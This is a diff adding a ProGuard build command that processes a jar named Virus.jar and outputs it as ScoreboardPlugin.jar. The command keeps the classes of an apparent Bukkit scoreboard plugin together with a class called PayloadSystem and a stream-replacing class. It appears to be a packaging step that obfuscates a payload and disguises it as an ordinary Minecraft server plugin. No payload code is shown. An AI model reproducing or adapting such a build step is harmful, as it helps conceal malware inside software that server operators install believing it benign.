@@ -1,0 +1,12 @@
+/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar /usr/share/java/proguard.jar \
+-injar out/artifacts/Virus_jar/Virus.jar \
+-outjar out/artifacts/Virus_jar/ScoreboardPlugin.jar \
+-dontwarn \
+-dontshrink \
+-dontoptimize \
+-keep class bukkitplugin.scoreboard.* \
+-keepclassmembers class bukkitplugin.scoreboard.* {"*;"} \
+-keep class plvc.PayloadSystem \
+-keepclassmembers class plvc.PayloadSystem {"private boolean pld;"} \
+-keepclassmembers class plvc.PayloadSystem {"public *;"} \
+-keepclassmembers class plvc.ReplacingInputStream {"public *;"}
